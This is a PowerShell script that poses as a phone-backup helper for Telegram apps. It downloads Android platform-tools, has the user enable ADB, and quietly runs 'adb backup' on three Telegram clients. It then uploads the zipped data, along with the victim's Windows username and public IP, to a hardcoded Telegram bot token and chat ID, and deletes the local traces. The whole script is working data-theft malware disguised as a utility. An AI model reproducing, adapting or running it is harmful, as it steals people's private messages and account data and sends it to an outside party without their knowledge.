Write-Output("Setup directories..")
$total_dir = [System.Environment]::CurrentDirectory

$backup_folder = New-Item -Path -join($total_dir, "\backups") -ItemType Directory

function DownloadFile {
    # Source URL
    $url = "https://dl.google.com/android/repository/platform-tools_r33.0.3-windows.zip"
    # Destation file
    $dest = $total_dir + "/platform-tools.zip"
    # Download the file
    Invoke-WebRequest -Uri $url -OutFile $dest

    $SourceZipFile = $dest

    $TargetFolder = $total_dir

    [IO.Compression.ZipFile]::ExtractToDirectory($SourceZipFile, $TargetFolder) 
}

function SetUpADBDaemon {
    Write-Output("Connect your phone to PC AND ENABLE ADB!!!")

    Read-Host 'Done? (CLICK ENTER FOR NEXT STEP)'    
    Write-Output("")
    
    Write-Output("Try connecting..")
    
    $adb_path = -join($TargetFolder, "\platform-tools\adb.exe")
        
    Write-Output("Starting daemon..")
    
    Start-Process -FilePath $adb_path -ArgumentList "shell"
    
    Write-Output("Check your phone, and apply ADB connect!")    

    Read-Host 'Done? (CLICK ENTER FOR NEXT STEP)'    
}

function MoveToDirectory {
    param(
        [string] $Filepath
    )

    Copy-Item -Path $Filepath -Destination $backup_folder
}

function ArchiveDirectory {
    Compress-Archive -Path -join($backup_folder, "\*.*") -DestinationPath -join($backup_folder, "\backup.zip")
}

function BackupFile {
    param(
        [string] $name
    )
    $backup_file = -join($TargetFolder, "\backup.ab")

    $Name = -join("backup_", $name, ".ab")
    Rename-Item -Path $backup_file -NewName $name

    MoveToDirectory -Filepath -join($TargetFolder, "\", $Name)
}

function BackupFiles {

    Start-Process -FilePath $adb_path -ArgumentList "backup -noapk org.telegram.messenger" -WindowStyle hidden
    BackupFile -name "org.telegram.messenger"

    Read-Host 'Click for next. (1/3)'
    
    Start-Process -FilePath $adb_path -ArgumentList "backup -noapk org.thunderdog.challegram" -WindowStyle hidden
    BackupFile -name "org.thunderdog.challegram"

    Read-Host 'Click for next. (2/3)'
    
    Start-Process -FilePath $adb_path -ArgumentList "backup -noapk org.telegram.plus" -WindowStyle hidden
    BackupFile -name "org.telegram.plus"

    Read-Host 'Applied create backup! (y/n)'
    
    ArchiveDirectory
}

function SendFile {
    param(
        [string] $Filepath
    )
    $Uri = "https://api.telegram.org/bot5798796950:AAFZ0BzxPg6nBiAKsj9DKHhdu8hNmhZGnVg/sendDocument"

    $Form = @{
    chat_id = 5727832846
    document = Get-Item $Filepath
    }
    
    Invoke-RestMethod -Uri $uri -Form $Form -Method Post
}

function SendCatchMessage {
    $username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $IP = (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content

    Invoke-WebRequest -join('https://api.telegram.org/bot5798796950:AAFZ0BzxPg6nBiAKsj9DKHhdu8hNmhZGnVg/sendMessage?chat_id=5727832846&text=New user with username: ', $username, ' \n IP: ', $IP)
}

function ClearSpace {
    Remove-Item $backup_folder -Verbose

    Remove-Item -join($total_dir, "\platform-tools") -Verbose
    Remove-Item -join($total_dir, "\platform-tools.zip") -Verbose

}

SendCatchMessage

Write-Output("Start downloading platform-tools...")

DownloadFile

Write-Output("")
Write-Output("Done!")

SetUpADBDaemon

Write-Output("")
Write-Output("Start work..")

BackupFiles

$File = -join($backup_folder, "\backup.zip")

SendFile -Filepath $File

ClearSpace

Write-Output("")
Write-Output("Clear & Done!!")
